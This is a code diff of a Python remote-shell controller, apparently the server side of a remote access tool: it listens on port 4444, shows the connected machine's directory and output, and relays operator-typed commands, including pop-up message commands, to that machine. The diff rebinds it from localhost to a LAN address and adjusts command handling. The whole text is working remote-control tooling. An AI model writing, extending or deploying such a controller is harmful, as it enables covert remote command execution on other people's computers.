@@ -2,6 +2,7 @@ from socket import *
 from os import system, name
 import sys
 import time
+import random
 
 def clear():
     if name == 'nt':
@@ -57,21 +58,22 @@ def handle_client(client_socket, addr):
                 break
 
             if receiver.startswith("DIR:"):
-                dir_end_idx = receiver.find('\n')
                 current_directory = receiver[4:]
-                receiver = receiver[dir_end_idx+1:].strip()
 
-            if (receiver) and not (receiver.startswith("DIR:")):
+            if receiver and not receiver == current_directory or receiver.startswith("DIR:"):
                 print(receiver)
 
             cmd = input(f"{current_directory}> ")
-            if cmd in ["exit", "quit", 'q']:
+            if cmd in ["exit", "quit", "q"]:
                 send_full_message(client_socket, cmd)
                 break
             elif cmd.lower().startswith("msgbox"):
                 send_full_message(client_socket, cmd)
             elif cmd in ["clear", "cls"]:
                 clear()
+                send_full_message(client_socket, cmd)
+            elif cmd is None or cmd == "":
+                send_full_message(client_socket, "generic_no_input")
             else:
                 send_full_message(client_socket, cmd)
 
@@ -83,7 +85,7 @@ def handle_client(client_socket, addr):
     print(f"Connection closed with {addr}\n")
 
 def main():
-    ip = "127.0.0.1"
+    ip = "192.168.6.165"
     port = 4444
 
     connection = socket(AF_INET, SOCK_STREAM)
